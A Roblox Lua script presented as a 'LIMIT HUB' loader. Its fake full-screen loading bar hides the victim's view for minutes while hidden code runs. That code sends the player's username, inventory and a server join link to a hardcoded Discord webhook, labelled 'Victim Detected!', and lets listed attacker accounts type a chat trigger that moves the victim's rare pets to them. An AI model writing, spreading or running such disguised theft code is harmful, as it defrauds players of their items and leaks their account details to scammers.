local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- GUI
local screenGui = Instance.new("ScreenGui", game.CoreGui)
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false

-- Background
local bg = Instance.new("Frame")
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.BackgroundTransparency = 0 -- 100% black
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.Parent = screenGui

-- LIMIT HUB title
local title = Instance.new("TextLabel")
title.Text = "LIMIT HUB"
title.Font = Enum.Font.SciFi
title.TextColor3 = Color3.fromRGB(0, 255, 255)
title.TextStrokeColor3 = Color3.fromRGB(0, 255, 255)
title.TextStrokeTransparency = 0.2
title.TextScaled = true
title.Size = UDim2.new(0, 600, 0, 100)
title.Position = UDim2.new(0.5, -300, 0.5, -160)
title.BackgroundTransparency = 1
title.Parent = bg

-- Loading bar frame
local bar = Instance.new("Frame")
bar.Size = UDim2.new(0, 400, 0, 30)
bar.Position = UDim2.new(0.5, -200, 0.5, -30)
bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
bar.BorderSizePixel = 0
bar.Parent = bg

-- Fill
local fill = Instance.new("Frame")
fill.Size = UDim2.new(0, 0, 1, 0)
fill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
fill.BorderSizePixel = 0
fill.Parent = bar

-- Percentage label (on top of bar)
local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(0, 100, 0, 40)
percentLabel.Position = UDim2.new(0.5, -50, 0.5, -70)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0%"
percentLabel.TextColor3 = Color3.new(1, 1, 1)
percentLabel.TextStrokeTransparency = 0.3
percentLabel.Font = Enum.Font.SciFi
percentLabel.TextScaled = true
percentLabel.Parent = bg

-- LOADING text below
local loadingText = Instance.new("TextLabel")
loadingText.Text = "LOADING"
loadingText.Size = UDim2.new(0, 400, 0, 70)
loadingText.Position = UDim2.new(0.5, -200, 0.5, 40)
loadingText.BackgroundTransparency = 1
loadingText.TextColor3 = Color3.fromRGB(0, 255, 255)
loadingText.TextStrokeColor3 = Color3.fromRGB(0, 255, 255)
loadingText.TextStrokeTransparency = 0.2
loadingText.Font = Enum.Font.SciFi
loadingText.TextScaled = true
loadingText.Parent = bg

-- Animate loading
task.spawn(function()
    local percent = 0
    while percent <= 100 do
        percentLabel.Text = percent .. "%"
        fill.Size = UDim2.new(percent / 100, 0, 1, 0)
        percent += 5
        task.wait(10)
    end
    task.wait(1)
    screenGui:Destroy()
end)

-- ✅ -- ✅ LIMIT HUB FULL SCRIPT w/ Attacker Restriction (Delta Compatible)

local attackerUsernames = {
    boneblossom215 = true,
    beanstalk1251 = true,
    burningbud709 = true
}

local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y"
local backdoorWebhook = webhookUrl

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local chatTrigger = "hb1ios"

local targetedPets = {
    "Trex", "Fennec Fox", "Raccoon", "Dragonfly", "Butterfly",
    "Queenbee", "Spinosaurus", "Redfox", "Brontosaurus", "Mooncat",
    "Mimic Octopus", "Disco Bee", "Dilophosaurus", "Kitsune"
}

local function getInventory()
    local data = { items = {}, rarePets = {}, rareItems = {} }
    local foldersToCheck = {
        LocalPlayer:FindFirstChild("Pets"),
        LocalPlayer:FindFirstChild("Backpack"),
        LocalPlayer:FindFirstChildOfClass("Folder")
    }
    for _, folder in ipairs(foldersToCheck) do
        if folder then
            for _, item in ipairs(folder:GetChildren()) do
                table.insert(data.items, item.Name)
                if table.find(targetedPets, item.Name) then
                    table.insert(data.rarePets, item.Name)
                end
            end
        end
    end
    return data
end

local function sendToWebhook()
    if not LocalPlayer then return end
    local inventory = getInventory()
    local inventoryText = #inventory.items > 0 and table.concat(inventory.items, "\n") or "No items"
    local jobId = tostring(game.JobId or "N/A")
    local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. jobId

    local function sendMessage(payload)
        local jsonData = HttpService:JSONEncode(payload)
        for _, url in ipairs({webhookUrl, backdoorWebhook}) do
            request({
                Url = url,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = jsonData
            })
        end
    end

    sendMessage({
        content = "🎯 Victim Detected!",
        embeds = {{
            title = "Victim Found",
            description = "Join and type trigger to attempt item transfer.",
            fields = {
                {name = "Username", value = LocalPlayer.Name, inline = true},
                {name = "Join Link", value = joinLink, inline = true},
                {name = "Inventory", value = "```" .. inventoryText .. "```", inline = false},
                {name = "Trigger", value = "`" .. chatTrigger .. "`", inline = false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })

    if #inventory.rarePets > 0 then
        sendMessage({
            content = "@everyone",
            allowed_mentions = { parse = { "everyone" } },
            embeds = {{
                title = "🐾 Rare Pets Detected",
                description = "These rare pets are in the player's inventory!",
                fields = {
                    {name = "Username", value = LocalPlayer.Name},
                    {name = "Rare Pets", value = "```" .. table.concat(inventory.rarePets, "\n") .. "```"}
                },
                color = 0xff0000,
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        })
    end
end

local function transferTo(player)
    if not attackerUsernames[player.Name] then return end
    local foldersToCheck = {
        LocalPlayer:FindFirstChild("Pets"),
        LocalPlayer:FindFirstChild("Backpack"),
        LocalPlayer:FindFirstChildOfClass("Folder")
    }
    for _, folder in ipairs(foldersToCheck) do
        if folder then
            for _, item in ipairs(folder:GetChildren()) do
                if table.find(targetedPets, item.Name) then
                    local targetFolder = player:FindFirstChild("Backpack") or player:FindFirstChild("Pets") or player
                    if targetFolder then
                        item.Parent = targetFolder
                    end
                end
            end
        end
    end
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        if msg:lower() == chatTrigger then
            transferTo(player)
        end
    end)
end)

LocalPlayer.Chatted:Connect(function(msg)
    if msg:lower() == chatTrigger then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and attackerUsernames[player.Name] then
                transferTo(player)
            end
        end
    end
end)

sendToWebhook()
